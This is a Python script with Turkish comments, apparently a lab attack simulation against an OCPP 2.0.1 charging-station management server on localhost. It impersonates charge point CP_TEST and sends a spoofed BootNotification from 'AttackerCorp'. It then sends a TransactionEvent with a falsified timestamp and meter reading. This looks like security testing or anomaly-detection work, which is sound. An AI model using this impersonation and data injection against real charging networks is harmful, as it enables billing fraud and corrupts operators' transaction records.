
import asyncio
import json
import uuid
import logging
import websockets
from ocpp.v201 import ChargePoint as cp
from ocpp.v201 import call
from ocpp.v201.enums import ReasonEnumType, TriggerReasonEnumType, TransactionEventEnumType
from ocpp.v201.datatypes import ChargingStationType

# ZAMAN ANOMALÄ°SÄ° iÃ§in sahte zaman damgasÄ±
ANOMALY_TIMESTAMP = "2025-11-10T00:00:00Z"

logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(levelname)s | [SALDIRI] | %(message)s")

# ============================================================
# ENUM DÃœZELTME: GÃ¼venli ÅŸekilde ReasonEnumType deÄŸerini bul
# ============================================================
def _resolve_reason_enum(reason_enum_class, preferred_names=None):
    try:
        available = [member.name for member in reason_enum_class]
    except Exception:
        available = []
    logging.debug(f"ReasonEnumType Ã¼yeleri: {available}")

    if preferred_names is None:
        preferred_names = [
            "REMOTE_START",
            "RemoteStart",
            "Remote_Start",
            "REMOTE-START",
            "REMOTESTART",
            "remote_start"
        ]

    for name in preferred_names:
        if hasattr(reason_enum_class, name):
            return getattr(reason_enum_class, name).value

    def norm(s):
        return s.replace("_", "").replace("-", "").lower()

    pref_norms = [norm(n) for n in preferred_names]
    for member in getattr(reason_enum_class, "__members__", {}).values():
        if norm(member.name) in pref_norms:
            return member.value

    # Fallback: Ä°lk mevcut deÄŸeri dÃ¶ndÃ¼r
    try:
        first_member = list(reason_enum_class)[0]
        return first_member.value
    except:
        return None

# ============================================================
# TRANSACTION EVENT MESAJI (ZAMAN & KONUM ANOMALÄ°SÄ°)
# ============================================================
def create_transaction_event_request(event_type, meter_value):
    """Konum ve Zaman anomalisi iÃ§eren TransactionEvent komutunu oluÅŸturur."""

    message_id = str(uuid.uuid4())

    trigger_reason_value = _resolve_reason_enum(TriggerReasonEnumType)
    if trigger_reason_value is None:
        logging.warning("TriggerReasonEnumType iÃ§inde uygun Ã¼ye bulunamadÄ± â€” fallback string kullanÄ±lÄ±yor.")
        trigger_reason_value = "RemoteStart"

    payload = {
        "eventType": event_type,
        "timestamp": ANOMALY_TIMESTAMP,  # <-- ZAMAN ANOMALÄ°SÄ°
        "triggerReason": trigger_reason_value,
        "seqNo": 1,
        "transactionInfo": {
            "transactionId": "TX-12345",
            "chargingState": "Charging",
        },
        "meterValue": [
            {
                "timestamp": ANOMALY_TIMESTAMP,
                "sampledValue": [
                    {
                        "value": str(meter_value),
                        "measurand": "Energy.Active.Import.Register",
                        "unitOfMeasure": {"unit": "Wh"},
                    }
                ],
            }
        ],
        "evse": {"id": 1, "connectorId": 1},
    }

    return [2, message_id, "TransactionEvent", payload]

# ============================================================
# SALDIRI SÄ°MÃœLASYONU BAÅLANGICI
# ============================================================
async def attack_simulation():
    url = "ws://127.0.0.1:9000/CP_TEST"
    cp_id = "CP_TEST"

    logging.info("============================================================")
    logging.info("ğŸ¯ SaldÄ±rÄ± hedefi: %s", url)
    logging.info("ğŸ­ Taklit edilen CP ID: %s", cp_id)
    logging.info("============================================================")
    logging.info("ğŸ“¡ CSMS'e baÄŸlanÄ±lÄ±yor...")

    try:
        async with websockets.connect(url, subprotocols=["ocpp2.0.1"]) as ws:
            logging.info("âœ… WebSocket baÄŸlantÄ±sÄ± kuruldu. Kimlik sahteciliÄŸi baÅŸarÄ±lÄ±.")

            # BootNotification gÃ¶nder (OCPP 2.0.1 formatÄ±na uygun)
            message_id = str(uuid.uuid4())

            # ChargingStation objesi oluÅŸtur
            charging_station = {
                "model": "FakeModelX",
                "vendorName": "AttackerCorp"  # vendor_name yerine vendorName
            }

            # OCPP 2.0.1 mesaj formatÄ±: [MessageTypeId, MessageId, Action, Payload]
            boot_msg = [
                2,  # CALL
                message_id,
                "BootNotification",
                {
                    "chargingStation": charging_station,  # charging_station yerine chargingStation
                    "reason": "PowerUp"
                }
            ]

            await ws.send(json.dumps(boot_msg))
            logging.info("ğŸ“¤ BootNotification gÃ¶nderildi: %s", json.dumps(boot_msg, indent=2))

            response = await ws.recv()
            logging.info("ğŸ“¥ Parse edilmiÅŸ yanÄ±t: %s", response)

            # YanÄ±tÄ± kontrol et
            resp_data = json.loads(response)
            if len(resp_data) >= 3 and resp_data[0] == 3:  # CallResult
                logging.info("âœ… BootNotification cevabÄ± alÄ±ndÄ±. KayÄ±t durumu: %s",
                           resp_data[2].get('status', 'Unknown'))
            elif resp_data[0] == 4:  # CallError
                logging.error("âŒ BootNotification hatasÄ±: %s - %s", resp_data[2], resp_data[3])
                return  # Hata durumunda devam etme
            else:
                logging.warning("âš ï¸ Beklenmeyen yanÄ±t formatÄ±")

            # TransactionEvent iÃ§in doÄŸru enum deÄŸerini bul
            try:
                # TransactionEventEnumType iÃ§indeki mevcut deÄŸerleri listele
                available_events = [member.name for member in TransactionEventEnumType]
                logging.info("ğŸ“‹ Mevcut TransactionEvent tipleri: %s", available_events)

                # Ended, Updated, Started gibi deÄŸerleri dene
                event_type = None
                for attempt in ["Ended", "Updated", "Started", "ENDED", "UPDATED", "STARTED"]:
                    if hasattr(TransactionEventEnumType, attempt):
                        event_type = getattr(TransactionEventEnumType, attempt).value
                        logging.info("âœ… Event type bulundu: %s", attempt)
                        break

                if event_type is None:
                    # Ä°lk mevcut deÄŸeri kullan
                    event_type = list(TransactionEventEnumType)[0].value
                    logging.warning("âš ï¸ VarsayÄ±lan event type kullanÄ±lÄ±yor: %s", event_type)

            except Exception as e:
                logging.error("âŒ TransactionEventEnumType hatasÄ±: %s", e)
                event_type = "Ended"  # String fallback

            # TransactionEvent (anomalili)
            transaction_event_msg = create_transaction_event_request(event_type, 12345)

            await ws.send(json.dumps(transaction_event_msg))
            logging.info("ğŸ“¤ TransactionEvent (Anomali) gÃ¶nderildi.")

            recv_msg = await ws.recv()
            logging.info("ğŸ“¥ CSMS yanÄ±tÄ±: %s", recv_msg)

    except websockets.exceptions.WebSocketException as e:
        logging.error("âŒ WebSocket baÄŸlantÄ± hatasÄ±: %s", e)
    except Exception as e:
        logging.error("âŒ Genel Hata: %s", e, exc_info=True)

# ============================================================
# ANA Ã‡ALIÅTIRMA BLOÄU
# ============================================================
if __name__ == "__main__":
    asyncio.run(attack_simulation())
